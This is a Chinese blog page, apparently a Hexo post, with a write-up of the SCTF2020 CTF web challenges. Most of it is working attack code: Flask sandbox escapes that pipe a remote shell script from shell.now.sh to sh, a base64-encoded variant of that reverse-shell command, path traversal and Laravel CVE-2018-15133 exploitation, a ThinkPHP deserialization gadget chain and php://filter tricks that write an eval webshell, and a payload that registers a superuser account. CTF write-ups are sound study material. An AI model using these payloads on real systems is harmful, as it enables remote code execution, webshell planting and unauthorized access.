@@ -1,0 +1,657 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>SCTF2020 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SCTF2020">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-07-08 09:15" pubdate>
+        2020年7月8日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SCTF2020</h1>
+            
+            <div class="markdown-body">
+              <h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p><code>https://github.com/dlau/koa-body/issues/75</code></p>
+<pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;files&quot;</span>:&#123;<span class="hljs-attr">&quot;file&quot;</span>:&#123;<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/proc/self/cwd/flag&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;&#125;&#125;</code></pre>
+
+<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><p><code>cmd=app.static_folder=request.form[request.method]&amp;POST=/</code></p>
+<p>更改静态目录为 / ，直接访问/static/flag就可以下载到flag</p>
+<p>Flask 中 </p>
+<pre><code class="hljs actionscript">static_folde 设置静态文件夹 默认<span class="hljs-keyword">static</span>文件夹
+static_url_path 访问方式 默认/<span class="hljs-keyword">static</span></code></pre>
+
+
+
+<h2 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h2><p>源码</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request
+
+app = Flask(__name__)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">security</span>():</span>
+    secret = request.form[<span class="hljs-string">&quot;cmd&quot;</span>]
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> secret:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">42</span> &lt;= <span class="hljs-built_in">ord</span>(i) &lt;= <span class="hljs-number">122</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error!&quot;</span>
+
+    exec(secret)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xXXxXXx&quot;</span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)
+</code></pre>
+
+
+
+<p>解1：</p>
+<p><a target="_blank" rel="noopener" href="http://phoebe233.cn/index.php/archives/53/#pysandbox2">http://phoebe233.cn/index.php/archives/53/#pysandbox2</a></p>
+<pre><code class="hljs python">__builtins__.<span class="hljs-built_in">ord</span>=<span class="hljs-keyword">lambda</span>*args:<span class="hljs-number">45</span> 覆盖<span class="hljs-built_in">ord</span> 绕过限制，就可以执行任意代码了
+
+app.view_functions[<span class="hljs-string">&#x27;security&#x27;</span>] = <span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;curl https://shell.now.sh/120.24.42.229:4040|sh&#x27;</span>).read()   
+可以覆盖security，也可以直接一点直接执行
+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;curl https://shell.now.sh/120.24.42.229:4040|sh&#x27;</span>).read()</code></pre>
+
+<p>解2：</p>
+<p><a target="_blank" rel="noopener" href="http://www.chara.pub/blog/2020/07/07/sctf-2020-writeup/#web-pythonsandbox2">http://www.chara.pub/blog/2020/07/07/sctf-2020-writeup/#web-pythonsandbox2</a></p>
+<pre><code class="hljs apache"><span class="hljs-comment">#把static的参数名称改成command</span>
+<span class="hljs-attribute">app</span>.url_map._rules[<span class="hljs-number">0</span>].rule = <span class="hljs-string">&quot;/static/&lt;command&gt;&quot;</span>
+<span class="hljs-comment">#因为新建正则需要括号，找一个方法调用static的路由的compile方法，让他生成一个新的正则</span>
+<span class="hljs-attribute">app</span>.view_functions[&#x27;security&#x27;]=app.url_map._rules[<span class="hljs-number">0</span>].compile
+<span class="hljs-comment">##从哪个包里找到os</span>
+<span class="hljs-attribute">app</span>.view_functions[&#x27;static&#x27;]=app.config.__class__.__init__.__globals__[&#x27;os&#x27;].system
+<span class="hljs-comment">#然后依次post /,get /static/getshell指令编码后</span>
+<span class="hljs-comment">#getshell指令不能带/</span>
+
+<span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.90.30:10000</span>/?POST=/static/&lt;command&gt;securitystaticos
+<span class="hljs-attribute">cmd</span>=a=request.args[request.method];app.url_map._rules[<span class="hljs-number">1</span>].rule=a[:<span class="hljs-number">17</span>];app.view_functions[a[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>]]=app.url_map._rules[<span class="hljs-number">1</span>].compile;app.view_functions[a[<span class="hljs-number">25</span>:<span class="hljs-number">31</span>]]=app.config.__class__.__init__.__globals__[a[<span class="hljs-number">31</span>:]].system
+<span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.90.30:10000</span>/static/curl$IFS$<span class="hljs-number">9</span>ctf.chara.pub:<span class="hljs-number">1234</span>%<span class="hljs-number">7</span>Csh</code></pre>
+
+<p>我没域名qwq  base64了一下才成</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.25.107:10002</span>/static/echo%<span class="hljs-number">24</span>IFS%<span class="hljs-number">249</span>%<span class="hljs-number">22</span>Y<span class="hljs-number">3</span>VybCBodHRwczovL<span class="hljs-number">3</span>NoZWxsLm<span class="hljs-number">5</span>vdy<span class="hljs-number">5</span>zaC<span class="hljs-number">8</span>xMjAuMjQuNDIuMjI<span class="hljs-number">5</span>OjQwNDB<span class="hljs-number">8</span>c<span class="hljs-number">2</span>g%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>Cbase<span class="hljs-number">64</span>%<span class="hljs-number">24</span>IFS%<span class="hljs-number">249</span>-d%<span class="hljs-number">7</span>Csh</code></pre>
+
+<p>解3：</p>
+<p>官方<a target="_blank" rel="noopener" href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/pysandbox">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/pysandbox</a></p>
+<pre><code class="hljs roboconf">劫持werkzeug.urls.url_parse = eval
+
+POST __import__(&#x27;os&#x27;).system(&#x27;curl$&#123;<span class="hljs-attribute">IFS&#125;https</span>://shell<span class="hljs-variable">.now</span><span class="hljs-variable">.sh</span>/120.24.42.229:4040|sh&#x27;) HTTP/1.1
+Host: __loader__
+User-Agent: Mozilla/5.0 (Windows NT 10.0; <span class="hljs-attribute">Win64; x64; rv</span>:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;<span class="hljs-attribute">q=0.9,image/webp,*/*;q=0.8</span>
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;<span class="hljs-attribute">q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+Connection: close
+Content-MD5: _bootstrap_external
+Content-Encoding: werkzeug<span class="hljs-variable">.urls</span>
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 246
+
+cmd=request<span class="hljs-variable">.__class__</span><span class="hljs-variable">._get_current_object</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.host</span>]<span class="hljs-variable">.__class__</span><span class="hljs-variable">.__weakref__</span><span class="hljs-variable">.__objclass__</span><span class="hljs-variable">.contents</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.host</span>]<span class="hljs-variable">.exec_module</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.content_md</span>5]<span class="hljs-variable">._bootstrap</span><span class="hljs-variable">.sys</span><span class="hljs-variable">.modules</span>[request<span class="hljs-variable">.content_encoding</span>]<span class="hljs-variable">.url_parse</span>=eval</code></pre>
+
+
+
+<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><p>非预期1：<a target="_blank" rel="noopener" href="http://phoebe233.cn/index.php/archives/53/#bestlanguage">http://phoebe233.cn/index.php/archives/53/#bestlanguage</a></p>
+<pre><code class="hljs awk">curl --path-as-is http:<span class="hljs-regexp">//</span><span class="hljs-number">39.104</span>.<span class="hljs-number">93.188</span><span class="hljs-regexp">/index.php/</span>tmp<span class="hljs-regexp">/../</span>../flag</code></pre>
+
+<p>非预期2：</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2018</span>-<span class="hljs-number">15133</span>一把梭
+<span class="hljs-attribute">https</span>://github.com/kozmic/laravel-poc-CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">15133</span>
+<span class="hljs-attribute">cookie</span>打</code></pre>
+
+<p>预期：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up</a></p>
+<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7457#toc-4">https://xz.aliyun.com/t/7457#toc-4</a></p>
+<p>thinkphp写shell</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> Pivot()];<span class="hljs-comment">//触发Model __toString(),子类Pivot合适</span>
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-comment">#Relation</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;
+        <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<span class="hljs-comment">#class Query</span>
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>;<span class="hljs-comment">#OneToOne HasOne</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-built_in">parent</span>::__construct();
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-built_in">parent</span>::__construct();
+        <span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&quot;no&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>];
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>;<span class="hljs-comment">#Output</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span> = <span class="hljs-literal">null</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> Memcached();<span class="hljs-comment">//目的调用其write()</span>
+        <span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<span class="hljs-comment">#Model</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>\<span class="hljs-title">HasOne</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;
+<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<span class="hljs-comment">#修改处</span>
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$aaaaa</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-keyword">new</span> Output();<span class="hljs-comment">#Output对象,目的是调用__call()</span>
+        <span class="hljs-keyword">$this</span>-&gt;append = [<span class="hljs-string">&#x27;getError&#x27;</span>];
+        <span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-keyword">new</span> HasOne();<span class="hljs-comment">//Relation子类,且有getBindAttr()</span>
+        <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<span class="hljs-comment">//isSelfRelation()</span>
+        <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>;<span class="hljs-comment">#Query</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-keyword">new</span> Output();
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#Memcached</span>
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> File();<span class="hljs-comment">//目的调用File-&gt;set()</span>
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>;<span class="hljs-comment">#File</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;options = [
+            <span class="hljs-string">&#x27;expire&#x27;</span>        =&gt; <span class="hljs-number">0</span>,
+            <span class="hljs-string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="hljs-literal">false</span>,
+            <span class="hljs-string">&#x27;prefix&#x27;</span>        =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
+            <span class="hljs-string">&#x27;path&#x27;</span>          =&gt; <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.iconv.utf-7.utf-8/resource=/var/www/html/public/nationalsb/+ADw?+AD0AQA-eval(+ACQAXw-POST+AFs-x+AF0)+ADs?+AD4-&#x27;</span>,
+            <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,
+        ];
+        <span class="hljs-keyword">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;
+    &#125;
+&#125;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;
+
+&#125;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;
+<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));</code></pre>
+
+<p>有几种绕exit拼接的</p>
+<pre><code class="hljs awk"><span class="hljs-comment"># 先过滤短标签，再utf-7转utf-8 </span>
+<span class="hljs-comment"># 转编码可这样 var_dump(iconv(&#x27;utf-8&#x27;, &#x27;utf-7&#x27;, &#x27;asdas&#x27;)); </span>
+php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.strip_tags|convert.iconv.utf-7.utf-8/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>public<span class="hljs-regexp">/nationalsb/</span>+ADw?+AD0AQA-eval(+ACQAXw-POST+AFs-x+AF0)+ADs?+AD4-
+
+<span class="hljs-comment"># utf-8转utf-7 再base64解码 </span>
+php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7|convert.base64-decode/</span>resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g<span class="hljs-regexp">/../</span>a.php
+
+<span class="hljs-comment"># UCS-2LE转UCS-2BE</span>
+php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.UCS-<span class="hljs-number">2</span>LE.UCS-<span class="hljs-number">2</span>BE<span class="hljs-regexp">/resource=?&lt;hp pn$ma=e_$EG[Tf&quot;li&quot;e;]f$li=e_$EG[Td&quot;wo&quot;n;]ifelp_tuc_noettn(sn$ma,eifelg_tec_noettn(sf$li)e;)ihhgilhg_tifel_(F_LI_E)_?;a&gt;a/</span>../</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
+<h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>注册admin权限的用户</p>
+<pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;wander1&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;is_staff&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;is_superuser&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;is_active&quot;</span>: <span class="hljs-number">1</span>&#125;</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/Jsonhub/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/Jsonhub/Write-up</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/SCTF2020/">SCTF2020</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/12/Zer0pts2020-urlapp/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[Zer0pts2020]urlapp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/30/redpwnCTF-2020/">
+                        <span class="hidden-mobile">redpwnCTF 2020</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
